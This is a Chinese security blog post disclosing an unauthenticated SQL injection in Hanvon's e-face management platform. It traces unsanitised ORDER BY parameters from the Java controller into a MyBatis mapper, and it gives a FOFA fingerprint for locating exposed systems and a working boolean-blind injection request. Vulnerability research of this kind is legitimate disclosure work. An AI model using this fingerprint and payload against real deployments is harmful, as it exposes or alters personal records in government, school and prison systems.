---
title: "汉王e脸通综合管理平台 getEmployeeByTeamId.do SQL注入漏洞"
source: https://mrxn.net/jswz/hanvon-efacego-getEmployeeByTeamId-sqli.html
asset_dir: assets/汉王e脸通综合管理平台-getemployeebyteamid.do-sql注入漏洞
---

# 汉王e脸通综合管理平台 getEmployeeByTeamId.do SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/8/10 08:26
- 556浏览
- [0评论](#comment)
- 28分钟阅读

深入探索

安全

授权

服务器安全服务

---

# 漏洞简介

汉王e脸通综合管理平台是汉王公司研发的一款基于生物识别技术的智慧园区管理[软件](#)，集成了考勤管理、门禁管理、访客管理、巡更管理、消费管理、车控管理、梯控管理、人事管理等多个模块，广泛应用于政府、企业、监狱、学校、智慧社区等多个领域，实现无接触式快速通行，提升管理效率和安全性。其管理平台的 `getEmployeeByTeamId.do` 接口存在 [SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。攻击者可在无需认证的情况下，通过构造恶意请求参数注入恶意 SQL 语句，导致数据库信息泄露、数据篡改甚至系统权限提升，影响系统数据安全和完整性。

SQL注入检测工具

# 影响版本

V1.6.x

# fofa语法

> icon\_hash="1380907357"

# 漏洞分析

深入探索

防火墙软件

文件大小转换

数据库

直接看 `PatrolTeamController` 里关于 `getEmployeeByTeamId` 的实现

```
@RequestMapping(
    value = {"getEmployeeByTeamId"},
    method = {RequestMethod.GET}
)
@ResponseBody
public RequestJson getEmployeeByTeamId(Integer page, Integer pageSize, String name, Long teamId, @RequestParam(required = false) String order, @RequestParam(required = false) String columnKey) {
    RequestJson result = new RequestJson();

    try {
        if (page == null) {
            page = Constants.DEFAULT_START_PAGE_INDEX;
        }

        if (pageSize == null) {
            pageSize = Constants.PAGE_SIZE;
        }

        PageHelper.startPage(page, pageSize);
        UserInfoParam record = new UserInfoParam();
        if (name != null) {
            record.setKey(name);
        }

        record.setOrder(order);
        record.setColumnKey(columnKey);
        if (null == teamId) {
            result.setSuccess(false);
            result.setMsg("操作失败");
        } else {
            record.setTeamId(teamId);
            List<PatrolTeamEmp> employeeList = this.patrolTeamBsm.getEmployeeByTeamId(record);
```

和 [汉王e脸通综合管理平台 queryManyPeopleGroupList.do SQL注入漏洞](https://mrxn.net/jswz/hanvon-efacego-queryManyPeopleGroupList-sqli.html) 处理逻辑差不多，直接看对应的 mapper xml文件 PatrolTeamDsm.xml

代码安全审计

```
<select id="getEmployeeByTeamId" parameterType="com.hanvon.iface.tpm.system.UserInfoParam" resultType="com.hanvon.iface.tpm.views.patrol.PatrolTeamEmp">
    select ptu.ID,ptu.USER_ID as userId,su.sz_name name,su.sz_mobile phone
     FROM PATROL_TEAM_USER ptu inner join sys_user su on ptu.USER_ID = su.ng_id
      and ptu.TEAM_ID = #{teamId}
      AND ptu.IF_IN = 1
    <if test="teamId != null">
        and ptu.TEAM_ID = #{teamId}
    </if>
    <if test="key != null and key != ''">
        and su.sz_name like CONCAT('%',#{key}, '%')
    </if>
    order by
    <if test="order == null or order == ''">
        ptu.ID desc
    </if>
    <if test="order != null and order != ''">
        ${columnKey} ${order}
    </if>
</select>
```

用户可控的 `columnKey` 和 `order` 参数未经任何过滤直接拼接到 SQL 语句的 `ORDER BY` 子句中，导致攻击者可构造恶意输入执行任意 SQL 命令，造成[SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。

# 漏洞复现

> 布尔盲注
>
> 漏洞预警服务

```
GET /manage/patrolTeam/getEmployeeByTeamId.do?recoToken=67mds2pxXQb&page=1&pageSize=10&columnKey=ptu.ID+RLIKE+(SELECT+(CASE+WHEN+(5992%3d5992)+THEN+0x7074752e4944+ELSE+0x28+END))%23+EeIa&order=desc&id=2&startTime=2025-05-02&endTime=2025-05-03&communityId=1&planId=1&lineId=1&teamId=1&areaId=1 HTTP/1.1
Host: hanvon.mrxn.net
```

[![汉王e脸通综合管理平台 getEmployeeByTeamId.do SQL注入漏洞](images/img-001-ef97ab691930.webp)](https://image.mrxn.net/ba681d687b9444409938c8aede944dbb.webp)

条件不等时

[![汉王e脸通综合管理平台 getEmployeeByTeamId.do SQL注入漏洞](images/img-002-ed125b8ba596.webp)](https://image.mrxn.net/58b72d72bd924d1abfc86bfb22cd274a.webp)

响应结果是不一样的

软件

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#0day](https://mrxn.net/tag/0day)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
